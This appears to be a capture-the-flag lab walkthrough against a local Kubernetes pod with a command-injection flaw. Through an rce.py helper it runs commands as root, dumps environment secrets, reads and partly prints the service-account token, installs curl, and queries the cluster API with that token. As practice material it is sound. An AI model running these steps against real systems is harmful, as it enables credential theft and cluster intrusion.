# Local Breach

[Back](../README.md)

- [Local Breach](#local-breach)
  - [Capture Flags](#capture-flags)
    - [Pod Secret](#pod-secret)
    - [SA token](#sa-token)

---

## Capture Flags

### Pod Secret

- app is accessible at `localhost:8080`

```sh
# test
python scripts/rce.py http://localhost:8080 id
# executable response:
# uid=0(root) gid=0(root) groups=0(root)

# get all env secret
python scripts/rce.py http://localhost:8080 "printenv"
# executable response:
# REACT2SHELL_PORT_80_TCP_PROTO=tcp
# KUBERNETES_PORT=tcp://10.96.0.1:443
# KUBERNETES_SERVICE_PORT=443
# NEXT_PRIVATE_WORKER=1
# npm_config_user_agent=npm/10.8.2 node/v20.20.2 linux x64 workspaces/false
# NODE_VERSION=20.20.2
# HOSTNAME=react2shell-8f9d7d998-b2xkl
# YARN_VERSION=1.22.22
# npm_node_execpath=/usr/local/bin/node
# npm_config_noproxy=
# HOME=/root
# PORT=3000
# npm_package_json=/app/package.json
# REACT2SHELL_PORT_80_TCP=tcp://10.96.233.212:80
# NODE_OPTIONS=--max-old-space-size=3892 --enable-source-maps
# npm_config_userconfig=/root/.npmrc
# npm_config_local_prefix=/app
# COLOR=0
# __NEXT_PROCESSED_ENV=true
# NEXT_PRIVATE_TRACE_ID=0e0a678e77e80d60
# REACT2SHELL_SERVICE_PORT_HTTP=80
# NEXT_DEPLOYMENT_ID=
# npm_config_prefix=/usr/local
# npm_config_npm_version=10.8.2
# __NEXT_PRIVATE_ORIGIN=http://localhost:3000
# npm_config_cache=/root/.npm
# __NEXT_PRIVATE_RUNTIME_TYPE=
# KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
# npm_config_node_gyp=/usr/local/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js
# RUST_MIN_STACK=8388608
# PATH=/app/node_modules/.bin:/node_modules/.bin:/usr/local/lib/node_modules/npm/node_modules/@npmcli/run-script/lib/node-gyp-bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# NODE=/usr/local/bin/node
# npm_package_name=react2shell
# KUBERNETES_PORT_443_TCP_PORT=443
# REACT2SHELL_SERVICE_HOST=10.96.233.212
# KUBERNETES_PORT_443_TCP_PROTO=tcp
# npm_lifecycle_script=next dev
# NEXT_RUNTIME=nodejs
# npm_package_version=0.1.0
# npm_lifecycle_event=dev
# REACT2SHELL_PORT=tcp://10.96.233.212:80
# REACT2SHELL_SERVICE_PORT=80
# KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
# KUBERNETES_SERVICE_PORT_HTTPS=443
# npm_config_globalconfig=/usr/local/etc/npmrc
# npm_config_init_module=/root/.npm-init.js
# KUBERNETES_SERVICE_HOST=10.96.0.1
# PWD=/app
# npm_execpath=/usr/local/lib/node_modules/npm/bin/npm-cli.js
# npm_config_global_prefix=/usr/local
# REACT2SHELL_PORT_80_TCP_ADDR=10.96.233.212
# npm_command=run-script
# PWD_SECRET=pod-hello-world
# NODE_ENV=development
# REACT2SHELL_PORT_80_TCP_PORT=80
# INIT_CWD=/app
# EDITOR=vi

# get pod tier flag
python scripts/rce.py http://localhost:8080 "printenv PWD_SECRET"
# pod-hello-world
```

---

### SA token

```sh
# get
python scripts/rce.py http://localhost:8080 "ls -l /var/run/secrets/kubernetes.io/serviceaccount"
# executable response:
# total 0
# lrwxrwxrwx 1 root root 13 Sep 24 22:01 ca.crt -> ..data/ca.crt
# lrwxrwxrwx 1 root root 16 Sep 24 22:01 namespace -> ..data/namespace
# lrwxrwxrwx 1 root root 12 Sep 24 22:01 token -> ..data/token

# get ns
python scripts/rce.py http://localhost:8080 "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"
# executable response:
# vuln

# get token
python scripts/rce.py http://localhost:8080 "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
# executable response:
# eyJhbGciOiJSUzI1NiIsImtpZCI6InU2WHhSQ0U3eXpiZlpfeWlHWGI0eDN3ck1iRkxGU0wzblVLck5tcEZwRjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jY...

# try request api
python scripts/rce.py http://localhost:8080 "curl https://kubernetes.default.svc"
# executable response:
# /bin/sh: 1: curl: not found

# get distro
python scripts/rce.py http://localhost:8080 "cat /etc/os-release"
# executable response:
# PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
# NAME="Debian GNU/Linux"
# VERSION_ID="12"
# VERSION="12 (bookworm)"
# VERSION_CODENAME=bookworm
# ID=debian
# HOME_URL="https://www.debian.org/"
# SUPPORT_URL="https://www.debian.org/support"
# BUG_REPORT_URL="https://bugs.debian.org/"

# install curl
python scripts/rce.py http://localhost:8080 "apt update"
python scripts/rce.py http://localhost:8080 "apt install curl -y"


python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace);TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api"


# Path to ServiceAccount token


# Read this Pod's namespace


# Read the ServiceAccount bearer token


# Reference the internal certificate authority (CA)


# Explore the API with TOKEN

```
